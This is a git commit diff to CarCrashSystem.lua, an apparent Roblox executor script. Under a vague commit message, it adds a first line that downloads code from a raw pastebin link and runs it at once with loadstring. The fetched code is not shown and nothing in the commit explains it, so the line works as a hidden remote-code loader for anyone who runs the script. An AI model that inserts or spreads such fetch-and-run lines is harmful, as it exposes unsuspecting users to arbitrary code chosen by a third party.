aad6eb32853181eefa9c0d50e63ac26a19cec634
xrt <xrtzrr@proton.me>
2024-04-06 20:17:12 -0600

    Came after awhile to edit.

--- CarCrashSystem.lua
+++ CarCrashSystem.lua
@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
 --< Loadstring: loadstring(game:HttpGet('https://raw.githubusercontent.com/xrtzrr/scripts/main/CarCrashSystem.lua'))()
 --< Game: https://www.roblox.com/games/9601565001/CCS
 
